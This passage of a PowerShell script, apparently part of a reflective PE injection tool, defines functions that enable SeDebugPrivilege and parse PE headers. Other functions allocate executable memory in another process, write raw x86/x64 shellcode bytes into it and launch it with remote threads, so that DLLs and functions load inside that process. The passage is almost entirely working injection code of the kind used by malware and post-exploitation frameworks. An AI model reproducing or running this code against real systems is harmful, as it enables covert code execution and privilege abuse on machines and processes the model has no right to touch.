        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw ""Unable to get the handle to the current thread""
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw ""Unable to impersonate self""
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw ""Unable to OpenThreadToken.""
                }
            }
            else
            {
                Throw ""Unable to OpenThreadToken. Error code: $ErrorCode""
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, ""SeDebugPrivilege"", $PLuid)
        if ($Result -eq $false)
        {
            Throw ""Unable to call LookupPrivilegeValue""
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw ""Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError""
            }
        }
        
        else
        {
            
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error ""Error creating remote thread, thread handle is null"" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw ""Invalid IMAGE_NT_HEADER signature.""
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    
    
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw ""PE file is not an EXE or DLL""
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw ""Unable to allocate memory in the remote process""
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw ""Unable to write DLL path to remote process memory""
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""LoadLibraryA"") 
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw ""Unable to allocate memory in the remote process for the return value of LoadLibraryA""
            }
            
            
            
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw ""Unable to allocate memory in the remote process for shellcode""
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw ""Unable to write shellcode to remote process memory.""
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
            }
            
            
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw ""Call to ReadProcessMemory failed""
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw ""Call to GetExitCodeThread failed""
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   
        
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw ""Unable to allocate memory in the remote process""
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw ""Unable to write DLL path to remote process memory""
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
            }
        }
        
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""GetProcAddress"") 

        
        
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw ""Unable to allocate memory in the remote process for the return value of GetProcAddress""
        }
        
        
        
        
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw ""Unable to allocate memory in the remote process for shellcode""
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw ""Unable to write shellcode to remote process memory.""
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
        }
        
        
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw ""Call to ReadProcessMemory failed""
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            
            
            
            
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString ""Copy-Sections::MarshalCopy"" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString ""Copy-Sections::Memset"" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true 
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


